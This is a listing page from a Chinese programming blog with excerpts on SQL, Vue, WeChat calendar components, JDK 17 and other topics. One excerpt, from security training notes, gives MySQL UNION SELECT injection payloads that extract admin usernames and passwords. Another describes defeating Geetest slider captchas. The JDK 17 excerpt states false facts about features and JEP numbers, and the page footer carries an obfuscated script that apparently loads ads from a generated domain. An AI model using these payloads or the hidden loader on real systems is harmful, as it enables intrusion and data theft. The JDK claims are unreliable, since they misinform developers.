		<a class="list__footer-readmore btn" href="/posts/85c6aa20994fd8bc45e7fb5d88274fe1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73ed868ac09dc0f7b23bc6ac9391543e/" rel="bookmark">
			解SQL联结：左联结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天我们用下面的表来学习左联结。其中，
学生表（student）：用来记录学生的基本信息
成绩表（score）：用来记录学生选修课程的成绩
1.什么是左联结？
左联结，会将左侧表中的数据全部取出来。下面图片中用文氏图画出了左联结，是红颜色的部分。
2.左联结是如何运行的？
下图是左联结的运行过程：
第1步，取出符合条件的行
两个表通过学号进行左联结，会将左侧的表作为主表，主表中的数据全部取出来，也就是将学生表里的数据全部取出来。
右边的表只选出和左边表相同学号的行，也就是学号0001所在的两行数据。
第2步，将两个表里取出的数据合并，如何合并呢？
这里就是进行交叉联结了。因为学号0002在右边的表里没有对应的行，所以这一行对应列的值是空值（Null）
3.左联结sql语句怎么写？
在图片里我加上了左联结对应的sql语句：
我们来看这个sql语句的3个关键地方：
第1个关键地方是在from子句
之前的from子句中只有1张表，而现在我们在from子句中同时使用了2张表。
由于表名太长，会影响sql的可读性，所以这里使用as对每个表起了别名，方便使用。在sql语句中我们给学生表起了别名叫做a，给成绩表起了别名叫做b。
在使用到列名的时候，为了方便区分这个列是哪个表的，所以会在列名前面加上表名.，所以你会看到在selec子句里的列名前面都加了表名。
因为这里select子句只查找出学号，姓名，课程号，所以最终查询结果是虚框里面的列。
第2个关键地方是from子句中用left join将两个表联结起来。
这里的left join就表示联结方式是左联结，选取出同时存在于两张表中的数据。
第3个关键地方是from子句中的关键字on后面的表示两个表通过哪个列匹配产生关系的，这里写的on a.学号=b.学号，表示两个表通过学号关联起来。
4.左联结变种
在左联结的基础上，我们再看一个问题，图片中红色部分的地方如何用sql表示呢？
这是在左联结的基础上去掉了，两个表中共同的地方，也就是去掉了两个圆圈的公共部分。
我们在刚才左联结的sql语句中，加入一个where子句 里面的条件是右边表的学号为空值。这样就选出了左边表，但是不属于两个表公共部分的数据，也就是图片中圆圈红色的部分：
你开将前面学过的联结在草稿纸上画出来，亲自理解下整个过程
我是猴子，中科院硕士/前IBM高级软件工程师/豆瓣8分《数据分析思维》作者，我在知乎知学堂上线了一个数据分析课程，结合IBM项目经验和国内互联网大厂一线业务案例，讲解常用模型+逻辑框架，还有常用数据分析工具带练+业务实操带练，数据分析技能和思维两条腿走路，让你成为真正的数据分析师，而不是数据处理工具人。
无论你是想学习个辅助工作的技能，还是想转行数据分析，都可以点击文末阅读原文链接学习：
往
一张图看懂sql运行顺序
期
领导让我预测下一年销量，怎么办？
回
一张图看懂数据分析、机器学习、深度学习、人工智能的关系
顾
带你了解数据分析的日常工作
⬇️点击「阅读原文」
进入 数据分析训练营
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6979b1ce6b495ac902335c22295b57c3/" rel="bookmark">
			【小迪安全】红蓝对抗 | 网络攻防 | V2022全栈培训笔记（WEB攻防24-30 -SQL注入）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移 知识点： 1、脚本代码与数据库前置知识
2、Acce33数据库注入-简易偏移
3、MYSQL数据库注入-简易&amp;权限跨库
#前置知识：
-SQL工注入漏洞产生原理分析
-SQL工注入漏洞危害利用分析
-脚本代码与数据库操作流程
-数据库名，表名，列名，数据
-数据库类型，数据库用户，用户权限
为了网站和数据库的安全性，MYSQL内置有OOT最高用户，划分等级，每个用户对应管理
一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。
MYSQL两种思路：
1、非ROOT的注入攻击：常规类的猜解
2、RO0T用户的注入攻击：文件读写操作，跨库查询注入等
MYSQL5.o以上版本：自带的数据库名information schema
information schema:存储数据库下的数据库名及表名，列名信息的表
获取相关数据：
l、数据库版本-看是否符合information schemai查询 version()
2、数据库用户-看是否符合ROOT型注入攻击 user()
3、当前操作系统-看是否支持大小写或文件路径选择 @@version_compile_os()
4、数据库名 为后期查询表名和列名做准备 database()
ROoT类型攻击-猜解数据，文件读写，跨库查询
获取当前数据库下面的表名信息：
UNION SELECT table name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
from information schema.tables where table schema=‘syguestbook’
获取表名syadminuser的列名信息：
UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
from information_schema.columms where table_name='sy_adminuser’I
and table schema=‘syguestbook’
获取指定数据：
UNION SELECT username,password,
3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy adminuser
跨库注入：实现当前网站跨库查询其他数据库对应网站的数据
获取当前mysq1下的所有数据库名
UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
from information_schema.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6979b1ce6b495ac902335c22295b57c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a2b2b50c370ad2c654c358f91232736/" rel="bookmark">
			微信小程序日历组件（可滑动，可展开收缩，可标点）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图
1.component/ calendar.wxml
&lt;!-- component/calendar/calendar.wxml --&gt; &lt;wxs src="./calendar.wxs" module="calculate" /&gt; &lt;view class="calendar"&gt; &lt;view class="header"&gt; &lt;view class="title"&gt; &lt;view class="header-wrap"&gt; &lt;view class="flex"&gt; &lt;view class="title"&gt;{{title}}&lt;/view&gt; &lt;view class="month"&gt; &lt;block wx:if="{{title}}"&gt;(&lt;/block&gt; {{selectDay.year}}年{{selectDay.month}}月 &lt;block wx:if="{{title}}"&gt;)&lt;/block&gt; &lt;/view&gt; &lt;/view&gt; &lt;block wx:if="{{goNow}}"&gt; &lt;view wx:if="{{open &amp;&amp; !(nowDay.year==selectDay.year&amp;&amp;nowDay.month==selectDay.month&amp;&amp;nowDay.day==selectDay.day)}}" class="today" bindtap="switchNowDate"&gt; 今日 &lt;/view&gt; &lt;/block&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;!-- 日历头部 --&gt; &lt;view class="flex-around calendar-week"&gt; &lt;view class="calendar-week-item" wx:for="{{calendarHeadDate}}" wx:key="item"&gt; {{calendarHeadDate[(index-firstDayOfWeek+7)%7]}} &lt;/view&gt; &lt;/view&gt; &lt;!-- 日历主体 --&gt; &lt;swiper class="swiper" style="height:{{swiperHeight}}rpx" bindchange="swiperChange" circular="{{true}}" current="{{swiperCurrent}}" duration="{{swiperDuration}}"&gt; &lt;swiper-item wx:for="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a2b2b50c370ad2c654c358f91232736/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33aa41892df98d6d860c2609b0fc4dbf/" rel="bookmark">
			微信小程序日历（包含可约、约满状态）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图： 代码如下： components/calendar/calendar.wxml
&lt;!--components/calendar/calendar.wxml--&gt; &lt;wxs module="func"&gt; module.exports = { // *星号替换 //将时间转为时间戳，在页面中判断时间戳小于昨天时间戳的呈灰色 getTime: function (value) { if (value) return getDate(value).getTime() else return getDate().getTime() - 86400000 } } &lt;/wxs&gt; &lt;view class="calendar"&gt; &lt;view class="title flex"&gt; &lt;view class="flex"&gt; &lt;!-- &lt;picker value="{{selectDay.year+'-'+selectDay.month}}" bindchange="editMonth" mode="date" fields="month" class="year-month"&gt;{{selectDay.year}}.{{selectDay.month&gt;9?selectDay.month:"0"+selectDay.month}}&lt;/picker&gt; --&gt; &lt;view class="icon" bindtap="lastMonth" style="transform:rotate(180deg);{{selectDay.month == newMonth ? 'color:#B3B3B3;':''}}"&gt; &lt;view class="iconfont icon-playfill"&gt;&lt;/view&gt; &lt;/view&gt; &lt;view class="year-month"&gt;{{selectDay.year}}年, {{selectDay.month&gt;9?selectDay.month:"0"+selectDay.month}}月&lt;/view&gt; &lt;view class="icon" bindtap="nextMonth" style="{{selectDay.month &gt; newMonth + 1 ? 'color:#B3B3B3;':''}}"&gt; &lt;view class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33aa41892df98d6d860c2609b0fc4dbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777fbedd64f202c2f425cd710d9543a4/" rel="bookmark">
			【vue3】处理数组方法，在数组中获取指定条件所在的数组对象等持续更新笔记~~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、在数组中获取指定条件所在的数组对象
（1）filter方法获取到的是包含指定项的数组
data.checkRow = res.result.filter(item =&gt; item.checked === 1); 打印：
（2）map方法取到的是包含指定项的数组，如果满足条件，则返回该对象；否则，返回 undefined
data.checkRow = res.result.map(item =&gt; { if (item.checked == 1) return item }) 所以要处理下
data.checkRow = res.result.map(item =&gt; { if (item.checked == 1) return item }).filter(Boolean) （3）reduce方法返回的是包含键值对的对象或直接返回
data.checkRow = res.result.reduce((acc, item) =&gt; { if (item.checked === 1) { acc[item.id] = item; } return acc; }, {}); data.checkRow = res.result.reduce((acc, item) =&gt; { if (item.checked === 1) { acc = item; } return acc; }, {}); （4）find方法直接返回对象
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/777fbedd64f202c2f425cd710d9543a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c15ea97b070656ffb5df138f915c0c96/" rel="bookmark">
			宁盾统一身份中台助力某集团公司实现统一身份认证和管理（如泛微OA、微软AD）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		某集团公司是一家以钢铁为主业，涉足互联网金融、文化健康、智慧城市、现代物流等多领域的大型现代化企业集团。创业发展已有三十余年，拥有员工人数超万人，为了提升管理效率，同时实现国产化创新和数字化转型，公司采用了泛微OA和微软AD作为两套账号管理系统。泛微OA用于员工的办公应用，而微软AD用于维护公司的身份源和对接其他应用和设备。
客户面临的问题 员工使用体验差 员工也面临一个常见但令人困扰的问题：他们需要在不同的系统中使用不同的用户名和密码登录，给工作效率和用户体验带来了负面影响。例如，当员工打开公司的邮件系统，需要输入与邮件系统相关的用户名和密码。然后，他们可能需要访问VPN、虚拟桌面等基础设施，每次都需要重复输入不同的用户名和密码。
多账号运维困难 同时，由于泛微OA和微软AD是两套独立的账号系统，管理员需要分别在两个系统中进行账号的创建、修改和删除，增加了账号维护的复杂性和工作量，容易出现数据不一致或冗余的情况。例如，当一个员工加入或离开公司时，需要在泛微OA和微软AD中分别进行账号的创建或停用，而且各自的权限设置也需要单独管理。
无法标准化策略 某集团公司需要实现多套身份策略的标准化管理，但是微软AD无法实现自助改密和转认证，这给员工的工作效率和用户体验带来了困扰。在传统的设置中，当员工忘记了他们的密码或密码到期时，他们必须联系管理员进行密码重置或更改，不仅消耗了员工和运维团队的时间，还可能影响员工的工作进展。此外，AD在默认配置下，无法将认证凭据转发给非LDAP协议的应用和设备。这意味着用户需要在每个应用或设备中单独进行身份认证，降低了工作效率和用户满意度。
为解决上述问题，某集团公司决定引入一套一体化的产品来实现各类场景的统一认证需求，提高用户体验、简化权限管理、增强安全性，并为业务扩展和集成提供更加灵活和可持续的解决方案。在这方面，宁盾是理想选择。
宁盾解决方案 宁盾作为一个中立第三方的身份基础设施提供商，可以代替传统国外身份管理产品（微软AD、IBM、ApacheDS、OpenLDAP）成为企业的主身份源，为应用、基础设施和终端提供统一身份认证。同时，宁盾还可以作为企业既有身份源（AD、OA、HR、自建等）对接下游应用的"桥梁"，降低对接成本和运维压力。
宁盾身份安全产品组成
在某集团公司案例中，使用宁盾身份目录替换微软AD，并通过LDAP协议承接了AD所对接的设备和应用。同时，通过Radius协议对接相关网络设备和VPN。宁盾还将泛微OA作为认证平台，并通过LDAP协议同步OA账号数据，并通过转认证的方式实现统一认证。未来，宁盾SSO平台还会陆续对接OA无法支持的其他应用和协议，帮助客户完善更多业务场景。
除此之外，提供自助改密平台给到用户，在密码到期前进行提醒，即便是员工出差在外，也不影响密码修改。
作为国内第三方中立的企业级身份基础设施提供商，宁盾以助力打造企业身份中国标准为使命，致力于构建健壮的身份基础设施，为企业客户和合作伙伴提供标准化的产品，实现全方位的身份安全保障。从2009年成立至今，宁盾身份安全技术持续精益创新，产品体系趋近完善，已拥有MFA多因子认证、统一身份认证（网络认证、AAA认证、SSO单点登录、访客管理）、终端准入、国产身份域管 4 大产品线，覆盖企业办公中的终端、基础设施、应用、运维等场景的身份认证与安全管理。 在某集团案例中，宁盾与泛微的生态合作为客户实现简化账号维护、提高工作效率、加强数据安全，并为未来的业务发展提供灵活性和可持续性的能力。除了与泛微的生态合作外，宁盾还与其他厂商进行广泛的生态合作，以提供更全面的解决方案。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6b9d0472de14273c82ede3fc99888b9/" rel="bookmark">
			【已解决】openssl: error while loading shared libraries: libssl.so.3: cannot open shared object file: No
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 原因解决方案 原因 没有把安装的ssl中libssl.so.3链接到/usr/lib中导致找不到
解决方案 查看是否安装有openssl，低版本ssl需要重新安装
whereis openssl 查询是否已有找不到的依赖
find / -name libssl.so.3 find / -name libcrypto.so.3 链接
ln -s /usr/local/openssl/lib/libssl.so.3 /usr/lib/libssl.so.3 ln -s /usr/local/openssl/lib64/libssl.so.3 /usr/lib64/libssl.so.3 ln -s /usr/local/openssl/lib/libcrypto.so.3 /usr/lib/libcrypto.so.3 ln -s /usr/local/openssl/lib64/libcrypto.so.3 /usr/lib64/libcrypto.so.3 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9628505be526b65d27716780085cf8c6/" rel="bookmark">
			vue 学习 -- day39（vue3 — reactive 对比 ref）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从定义数据角度对比： ref用来定义：基本类型数据。reactive用来定义：对象（或数组）类型数据。备注：ref也可以用来定义对象（或数组）类型数据, 它内部会自动通过reactive转为代理对象。从原理角度对比： ref通过Object.defineProperty()的get与set来实现响应式（数据劫持）。reactive通过使用Proxy来实现响应式（数据劫持）, 并通过Reflect操作源对象内部的数据。从使用角度对比： ref定义的数据：操作数据需要.value，读取数据时模板中直接读取不需要.value。reactive定义的数据：操作数据与读取数据：均不需要.value。 一般来说，会把组件里面用到的数据封装到对象里给 reactive 加工成响应式对象（代理对象），这样读取或修改的时候就不用 .value 了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba876ff93961c661457c43457f9184f0/" rel="bookmark">
			vue 学习 -- day36（vue3 — 分析工程结构）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 //引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'
//创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更“轻”，它少了很多属性和方法)
const app = createApp(App)
//挂载
app.mount('#app')
注意：不兼容 vue2 的写法
vue3 组件中的模板结构可以没有根标签了！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeded5a13123da59220ed0ee64d2cf35/" rel="bookmark">
			〖Python网络爬虫实战㊶〗- 极验滑块介绍（三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		订阅：新手可以订阅我的其他专栏。免费阶段订阅量1000+ python项目实战
Python编程基础教程系列（零基础小白搬砖逆袭)
说明：本专栏持续更新中，订阅本专栏前必读关于专栏〖Python网络爬虫实战〗转为付费专栏的订阅说明作者：爱吃饼干的小白鼠。Python领域优质创作者，2022年度博客新星top100入围，荣获多家平台专家称号。 最近更新 〖Python网络爬虫实战㊵〗- 极验滑块介绍（二）
极验验证码 目前，许多网站采取各种各样的措施来反爬虫，其中一个措施便是使用验证码。随着技术的发展，验证码的花样越来越多。验证码最初是几个数字组合的简单的图形验证码，后来加入了英文字母和混淆曲线。有的网站还可能看到中文字符的验证码，这使得识别愈发困难。我们今天来介绍极验验证码。
前言 我们上一篇和大家介绍了怎么去处理图片的还原，今天，我们来说说怎么去计算滑块移动的距离，我们可以通过open-cv来识别，或者其他识别库来识别，我们还可以对比两个图片的像素点。这些都可以直接用别人写好的代码，我这里就不过多赘述。
滑块距离计算 第一种是cv2方法，我找到别人写的比较好的，亲测可用，至于相关库的安装，自己去搜教程。
import io from PIL import Image import cv2 import numpy as np # 将 Image 转换为 Mat，通过 flag 可以控制颜色 def pilImgToCv2(img: Image.Image, flag=cv2.COLOR_RGB2BGR): return cv2.cvtColor(np.asarray(img), flag) # 弹窗查看图片 def showImg(bg: cv2.Mat, name='test', delay=0): cv2.imshow(name, bg) cv2.waitKey(delay) cv2.destroyAllWindows() def getDistance(img: Image.Image, slice: Image.Image): # 通过 pilImgToCv2 将图片置灰 # 背景图和滑块图都需要做相同处理 grayImg = pilImgToCv2(img, cv2.COLOR_BGR2GRAY) # showImg(grayImg) # 可以通过它来看处理后的图片效果 graySlice = pilImgToCv2(slice, cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eeded5a13123da59220ed0ee64d2cf35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4abf7e9cbb67deb0f781b328e11d254/" rel="bookmark">
			【Java】JDK 17：新特性和增强功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 JDK 17 是 Java 开发工具包的最新版本，它带来了许多令人兴奋的新特性和增强功能。这些改进涵盖了语言、库、工具和性能方面，旨在提高开发人员的生产力和应用程序的质量。
在本博客中，将尽可能多的列举 JDK 17 中的所有重要特性，让你了解这个版本的全貌。
新特性 基于模块的系统（JEP 376）：
JDK 17 引入了基于模块的系统，将 Java 语言模块化，以提高代码的可维护性、可扩展性和安全性。模块化使得开发人员可以更好地管理依赖关系和可见性，从而简化了项目的组织和构建过程。
延长JVM生命周期（JEP 388）：
JDK 17 延长了 JVM 的生命周期，为开发人员提供更长时间的支持和维护。这意味着开发人员可以更长时间地使用特定版本的 JVM，而无需频繁升级到新版本。
增强的Switch语句（JEP 361）：
JDK 17 对 Switch 语句进行了增强，引入了新的语法和功能。现在，Switch 语句可以用于处理更复杂的条件和多个分支，使得代码更加清晰和易读。
无限制的本地变量类型推断（JEP 395）：
JDK 17 允许在 Lambda 表达式、匿名类和方法引用中使用无限制的本地变量类型推断。这使得代码更简洁，减少了冗余的类型声明。
元数据的升级和访问（JEP 394）：
JDK 17 对元数据进行了升级和访问的改进，使得开发人员可以更好地处理和利用元数据信息。这有助于实现更灵活和可扩展的代码。
Sealed JVM（密封 JVM）：
JDK 17 引入了对 JVM 类的密封机制，以确保只有受信任的类可以修改 JVM 内部的关键行为。
Foreign Function &amp; Memory API（外部函数和内存 API）：
JDK 17 引入了 Foreign Function &amp; Memory API，它提供了一种与本地代码（如 C 和 C++）交互的标准方式。这使得在 Java 中调用本地函数和操作内存变得更加简单和安全。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4abf7e9cbb67deb0f781b328e11d254/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a74beeb93051520b5526e58bbea4566/" rel="bookmark">
			Day53力扣打卡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打卡记录 重新规划路线（dfs） 链接
class Solution: def dfs(self, x: int, parent: int, e: List[List[List[int]]]) -&gt; int: res = 0 for edge in e[x]: if edge[0] == parent: continue res += edge[1] + self.dfs(edge[0], x, e) return res def minReorder(self, n: int, connections: List[List[int]]) -&gt; int: e = [[] for _ in range(n)] for edge in connections: e[edge[0]].append([edge[1], 1]) e[edge[1]].append([edge[0], 0]) return self.dfs(0, -1, e) 回路计数（DP状态压缩） 链接
import os import sys import math n = 21 st = [[False] * n for _ in range(n)] for i in range(0, n, 2): for j in range(i + 1, n): if math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a74beeb93051520b5526e58bbea4566/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dcf418d5c755e5db0db201532821fe0/" rel="bookmark">
			C#使用Matrix类对Dicom图像的放缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C#使用Matrix类对Dicom图像的放缩，使用Matrix 1.同时操作水平、垂直同时放缩
// 创建一个 Matrix 对象 Matrix m_Matrix = new Matrix(); //放缩参数 float inputZoom=1.2f; m_Matrix.Scale(inputZoom, inputZoom, MatrixOrder.Append); 2.操作水平（X轴）放缩，垂直缩放因子为 1f
// 创建一个 Matrix 对象 Matrix m_Matrix = new Matrix(); //放缩参数 float inputZoom=1.2f; m_Matrix.Scale(inputZoom, 1f, MatrixOrder.Append); 3.操作垂直（Y轴）放缩，水平缩放因子为 1f
// 创建一个 Matrix 对象 Matrix m_Matrix = new Matrix(); //放缩参数 float inputZoom=1.2f; m_Matrix.Scale(1f, inputZoom, MatrixOrder.Append); MatrixOrder.Append的注释：
// // 摘要: // 指定矩阵变换操作的顺序。 public enum MatrixOrder { // // 摘要: // 在旧操作前应用新操作。 Prepend, // // 摘要: // 在旧操作后应用新操作。 Append } 在 C# 中，可以使用 System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dcf418d5c755e5db0db201532821fe0/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/46/">«</a>
	<span class="pagination__item pagination__item--current">47/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/48/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0